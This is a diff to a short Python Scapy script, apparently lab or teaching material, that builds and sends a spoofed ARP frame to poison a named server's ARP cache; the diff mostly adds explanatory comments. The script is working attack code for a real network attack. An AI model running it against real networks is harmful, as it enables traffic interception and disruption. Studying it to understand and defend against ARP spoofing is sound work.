@@ -1,16 +1,24 @@
+# This script illustrates the ARP cache poisoning attack.
+
 from scapy.layers.inet import Ether
 from scapy.layers.l2 import ARP
 from scapy.all import *
 
-MY_IP = '10.0.4.34'
-MY_HW = 'ec:b1:d7:31:23:25'
-DST_IP = '10.0.4.25'
-DST_HW = 'ec:b1:d7:31:24:b5'
+# Goal:
+#   You have the IP address '10.0.4.34' and the MAC address 'ec:b1:d7:31:23:25'.
+#   You want to poison the ARP cache of a remote server.
+#   => you want to make it believe that your hardware address is '00:01:02:03:04:31' (instead of 'ec:b1:d7:31:23:25').
+
+MY_IP = '10.0.4.34'  # My IP address
+MY_HW = 'ec:b1:d7:31:23:25'  # My hardware address
+DST_IP = '10.0.4.25'  # The IP address of the server you want to poison the ARP cache.
+DST_HW = 'ec:b1:d7:31:24:b5'  # The hardware of the server you want to poison the ARP cache.
 
 print(conf.iface)
 
 trame = Ether(
     dst=DST_HW,
+    # Note: you don't have to modify the following MAC address (src=...).
     src='00:01:02:03:04:31') /\
         ARP(
             # NOTE:
@@ -25,9 +33,3 @@ trame = Ether(
 trame.show()
 rep = srp1(trame, iface='eno1')
 rep.show()
-
-
-
-
-
-
